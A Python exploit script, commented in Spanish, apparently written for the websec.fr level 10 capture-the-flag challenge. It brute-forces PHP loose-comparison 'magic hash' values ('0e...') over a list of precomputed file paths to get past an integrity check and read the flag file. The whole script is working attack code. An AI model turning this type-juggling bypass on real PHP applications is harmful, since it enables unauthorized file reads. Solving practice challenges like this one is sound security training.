#!/usr/bin/env python3
import requests
import time

url = "https://websec.fr/level10/index.php"

# Paths que generan hashes 0e localmente (encontrados en búsqueda anterior)
magic_paths = [
    'as3flag.php', 'a3vflag.php', 'blrflag.php', 'bltflag.php', 'bp4flag.php',
    'b_cflag.php', 'cfkflag.php', 'fbxflag.php', 'gwtflag.php', 'hbaflag.php',
    'h6zflag.php', 'ifzflag.php', 'je9flag.php', 'jxcflag.php', 'kf3flag.php',
    'kibflag.php', 'krqflag.php', 'kurflag.php', 'l0dflag.php', 'm10flag.php',
    'nzhflag.php', 'o7hflag.php', 'pzwflag.php', 'qpjflag.php', 'q50flag.php',
    'riuflag.php', 'rtqflag.php', 'shoflag.php', 'sp_flag.php', 's4mflag.php',
    'ti8flag.php', 'uvwflag.php', 'u6sflag.php', 'vr_flag.php', 'v1sflag.php',
    'v.pflag.php', 'wgjflag.php', 'wrxflag.php', 'xdgflag.php', 'yciflag.php',
    'yx7flag.php', 'y.2flag.php', 'y_3flag.php', '1vpflag.php', '2u_flag.php',
    '3muflag.php', '4qnflag.php', '462flag.php', '48_flag.php', '4.5flag.php',
    '5imflag.php', '6hzflag.php', '6w2flag.php', '7wfflag.php', '8gvflag.php',
    '8w.flag.php', '8-2flag.php', '_dmflag.php', '_q6flag.php', '-d6flag.php',
    '-eoflag.php', '-seflag.php', '-tyflag.php', '-8gflag.php'
]

print(f"Probando {len(magic_paths)} paths mágicos con hashes 0e...")
print("="*60 + "\n")

tested = 0

for i, path in enumerate(magic_paths):
    print(f"[{i+1}/{len(magic_paths)}] Probando: {path}", flush=True)
    
    # Probar con muchos hashes 0e diferentes
    for j in range(500):
        hash_val = f"0e{j:06d}"
        
        try:
            r = requests.get(url, params={"f": path, "hash": hash_val}, timeout=3)
            tested += 1
            
            if "WEBSEC{" in r.text:
                flag_start = r.text.find("WEBSEC{")
                flag_end = r.text.find("}", flag_start)
                flag = r.text[flag_start:flag_end+1]
                
                print(f"\n{'='*60}")
                print(f"¡¡¡FLAG ENCONTRADA!!!")
                print(f"{'='*60}")
                print(f"FLAG: {flag}")
                print(f"Path: {path}")
                print(f"Hash: {hash_val}")
                
                with open("/workspace/websec_level10/FLAG.txt", "w") as f:
                    f.write(f"FLAG: {flag}\nPath: {path}\nHash: {hash_val}\n")
                
                exit(0)
        
        except Exception as e:
            continue
        
        if tested % 100 == 0:
            print(f"  Probados: {tested}", flush=True)
        
        if tested % 50 == 0:
            time.sleep(0.05)

print(f"\nTotal probado: {tested}")